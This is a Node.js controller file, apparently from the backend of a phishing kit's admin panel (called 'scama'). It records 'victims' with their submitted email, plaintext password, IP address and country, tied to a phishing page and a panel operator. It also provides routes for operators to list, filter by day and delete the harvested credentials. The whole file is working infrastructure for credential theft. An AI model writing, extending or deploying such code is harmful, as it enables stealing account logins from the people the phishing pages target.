const { scama, users, victims, page } = require("../model");
const today = require("../config/date");
const time = require("../config/time");
const httperror = require("http-errors");

module.exports = {
  /// add new victims
  addNewVictims: async (req, res) => {
    let body = req.body;
    let times = Date.now();
    await victims
      .create({
        email: req.body.email,
        ip: req.headers["x-forwarded-for"] || req.socket.remoteAddress || null,
        password: req.body.password,
        country: req.body.country,
        delete: 0,
        block: 0,
        date: today,
        vu: 0,
        time: times,
        userId: req.body.userId,
        pageuserId: req.body.pageId,
      })
      .then((resu) => {
        res.json({
          message: "Successfully add vic" + time,
        });
      })
      .catch((err) => {
        res.json({
          message: "error insert data" + err,
        });
      });
  },
  /// get victims
  getInfoVictim: async (req, res, next) => {
    try {
      //   console.log(await req.user.id);
      if (parseInt(req.headers.id) != req.user.id) {
        throw httperror.Forbidden("not permission user");
      }
      let params = req.params;
      let qu;
      if (params.id) {
        qu = await victims.findOne({
          where: { userId: params.id, delete: 0 },
          include: [
            { model: page },
            {
              model: users,
              attributes: { exclude: ["password", "email", "ip", "member"] },
            },
          ],
        });
      } else {
        //////ytyutyu
        if (req.headers.id == 1) {
          qu = await victims.findAll({
            where: { delete: 0 },
            limit: 200,
            include: [
              { model: page },
              {
                model: users,
                attributes: { exclude: ["password", "email", "ip", "member"] },
              },
            ],
            order: [["id", "DESC"]],
          });
        } else {
          qu = await victims.findAll({
            where: { userId: req.headers.id, delete: 0 },
            limit: 200,
            include: [page, users],
            order: [["id", "DESC"]],
          });
        }
      }
      res.send(qu);
    } catch (error) {
      next(error);
    }
  },
  // get today victims
  getVictimByDate: async (req, res) => {
    try {
      let params = req.params;
      let qu;
      if (params.id) {
        qu = await victims.findOne({
          where: {
            userId: params.id,
            delete: 0,
            date: today,
          },
          include: [
            { model: page },
            {
              model: users,
              attributes: { exclude: ["password", "email", "ip", "member"] },
            },
          ],
        });
      } else {
        if (req.headers.id == 1) {
          qu = await victims.findAll({
            where: {
              delete: 0,
              date: today,
            },
            limit: 200,
            order: [["id", "DESC"]],
            include: [
              { model: page },
              {
                model: users,
                attributes: { exclude: ["password", "email", "ip", "member"] },
              },
            ],
          });
        } else {
          qu = await victims.findAll({
            where: {
              userId: req.headers.id,
              delete: 0,
              date: today,
            },
            limit: 200,
            order: [["id", "DESC"]],
            include: [page, users],
          });
        }
      }
      res.send(qu);
    } catch (error) {
      res.json({
        message: "error server " + error,
      });
    }
  },
  // update victims and delete in user
  deleteVictim: async (req, res) => {
    try {
      let checkuser = await victims.findAll({
        where: { id: req.params.id, block: 0 },
      });
      if (checkuser.length > 0) {
        await victims
          .update(
            {
              delete: 1,
            },
            { where: { id: req.params.id } }
          )
          .then((resp) => {
            res
              .json({
                message: " successfully update info",
              })
              .catch((err) => {
                res.json({
                  message: " error update try agian",
                });
              });
          });
      }
    } catch (error) {
      res.json({
        message: " error " + error,
      });
    }
  },
};
